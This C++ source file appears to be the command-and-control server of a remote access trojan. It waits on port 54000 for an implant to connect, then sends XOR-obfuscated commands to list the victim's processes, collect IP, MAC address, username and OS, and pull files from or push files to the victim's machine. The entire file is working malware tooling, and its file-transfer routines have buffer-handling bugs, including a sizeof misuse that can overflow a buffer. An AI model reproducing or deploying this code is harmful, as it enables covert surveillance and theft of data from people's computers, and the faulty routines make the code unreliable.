#include "pch.h"
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#pragma comment (lib, "ws2_32.lib")

using namespace std;


void sendFile(SOCKET sock, const char* fileName);
string encryptDecrypt(string toEncrypt);

int main()
{

	// Initalize winsock

	WSADATA wsDATA;
	WORD ver = MAKEWORD(2, 2);

	int wsOk = WSAStartup(ver, &wsDATA);
	if (wsOk != 0)
	{
		std::cerr << "Can't Initalize winsock! Quitting" << std::endl;
		return 0;
	}


	// Create a socket

	SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
	if (listening == INVALID_SOCKET)
	{
		std::cerr << "Can't create a socket! Quitting" << std::endl;
		return 0;
	}

	// Bind the socket to an IP Address and port

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(54000);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	bind(listening, (sockaddr*)&hint, sizeof(hint));

	// Tell winsock the socket is for listening

	listen(listening, SOMAXCONN);


	// Wait for a connection

	sockaddr_in client;
	int clientSize = sizeof(client);

	SOCKET clientSocket = accept(listening, (sockaddr*)&client, &clientSize);

	char host[NI_MAXHOST];
	char service[NI_MAXHOST];

	ZeroMemory(host, NI_MAXHOST);
	ZeroMemory(service, NI_MAXHOST);

	if (getnameinfo((sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0)
	{
		std::cout << host << " connected on port " << service << std::endl;
	}
	else
	{
		inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
		std::cout << host << " connected on port " <<
			ntohs(client.sin_port) << std::endl;
	}

	// Close listening socket

	closesocket(listening);

	// While loop: accept and echo message back to client

	char buf[4096];
	char buff[4096];
	string userInput;

	do
	{
		// Prompt the user for some text
		std::cout << "Command > ";
		getline(cin, userInput);

		if (userInput.size() > 0) //make sure user typed something
		{
			// send the text

			string encryptedCommand = encryptDecrypt(userInput);

			int sendResult = send(clientSocket, encryptedCommand.c_str(), encryptedCommand.size() + 1, 0);
			if (sendResult != SOCKET_ERROR)
			{

				if (userInput.compare("ProcessList") == 0) {
					while (true)
					{
						ZeroMemory(buf, 4096);
						int bytesRecieved = recv(clientSocket, buf, 4096, 0);
						string decryptedProc = encryptDecrypt(string(buf, 0, bytesRecieved));
						if (bytesRecieved > 0) {
							if (decryptedProc.compare("DONE") == 0)
							{
								break;
							}
							else 
							{
								cout << decryptedProc << endl;
							}
						}
						
					}

					cout << "------------------------------------------------------" << endl;
					
				} 
				else if (userInput.compare("MachineConfig") == 0)
				{
					// wait for response
					ZeroMemory(buf, 4096);
					int bytesRecieved = recv(clientSocket, buf, 4096, 0);
					if (bytesRecieved > 0)
					{
						// echo response to console
						string decryptedIP = encryptDecrypt(string(buf, 0, bytesRecieved));

						std::cout << "IP Address: " << decryptedIP << std::endl;
					}

					ZeroMemory(buf, 4096);
					bytesRecieved = recv(clientSocket, buf, 4096, 0);
					if (bytesRecieved > 0)
					{
						// echo response to console
						string decryptedMAC = encryptDecrypt(string(buf, 0, bytesRecieved));

						std::cout << "MAC Address: " << decryptedMAC << std::endl;
					}

					ZeroMemory(buf, 4096);
					bytesRecieved = recv(clientSocket, buf, 4096, 0);
					if (bytesRecieved > 0)
					{
						// echo response to console
						string decryptedUsername = encryptDecrypt(string(buf, 0, bytesRecieved));

						std::cout << "Username: " << decryptedUsername << std::endl;
					}

					ZeroMemory(buf, 4096);
					bytesRecieved = recv(clientSocket, buf, 4096, 0);
					if (bytesRecieved > 0)
					{
						// echo response to console
						string decryptedOS = encryptDecrypt(string(buf, 0, bytesRecieved));

						std::cout << "OS: " << decryptedOS.c_str() << std::endl;
					}

					cout << "------------------------------------------------------" << endl;

				} 
				else if (userInput.compare("Download") == 0)
				{
					cout << "Filename: ";
					getline(cin, userInput);
					send(clientSocket, userInput.c_str(), 256, 0);

					char direct[256];
					GetCurrentDirectoryA(256, direct);

					string path = string(direct);

					path.append("\\");
					path.append(userInput);

					cout << path << endl;

					FILE* file;
					file = fopen(path.c_str(), "wb");

					ZeroMemory(buf, 4096);
					int bytesRecieved = recv(clientSocket, buf, 4096, 0);
					if (bytesRecieved > 0) {

						ZeroMemory(buff, 4096);
						char key = 'K';

						for (int i = 0; i < sizeof(buf); i++)
						{

							buff[i] = buf[i] ^ key;
						}

						fwrite(buff, 1, bytesRecieved, file);
						fclose(file);
					}

					std::cout << "File Recieved" << endl;
					cout << "------------------------------------------------------" << endl;

				}
				else if (userInput.compare("Upload") == 0)
				{
					cout << "Filename: ";
					getline(cin, userInput);
					send(clientSocket, userInput.c_str(), 256, 0);

					char direct[256];
					GetCurrentDirectoryA(256, direct);
					
					string path = string(direct);
					string file = string(userInput);

					path.append("\\");
					path.append(userInput);

					sendFile(clientSocket, path.c_str());

					cout << "------------------------------------------------------" << endl;
					
				}
				

			}

		}


	} while (userInput.size() > 0);

	// Close the socket

	closesocket(clientSocket);

	// Shutdown winsock 

	WSACleanup();



}


void sendFile(SOCKET sock, const char* fileName)
{

	FILE *file;
	char *buffer;
	long int filelen;
	char buff[8192];

	file = fopen(fileName, "rb");
	fseek(file, 0, SEEK_END);	
	filelen = ftell(file);
	rewind(file);

	buffer = (char *)malloc((filelen + 1) * sizeof(char));
	fread(buffer, filelen, 1, file);
	fclose(file);

	ZeroMemory(buff, 8192);
	char key = 'K';

	cout << sizeof(buffer) << endl;

	for (int i = 0; i < (sizeof(buffer) * 1024); i++)
	{
		
		buff[i] = buffer[i] ^ key;

		//Sleep(1);
		//printf("");

	}

	send(sock, buff, filelen, 0);


}

string encryptDecrypt(string toEncrypt)
{
	char key = 'K'; //Any char will work
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key;

	return output;
}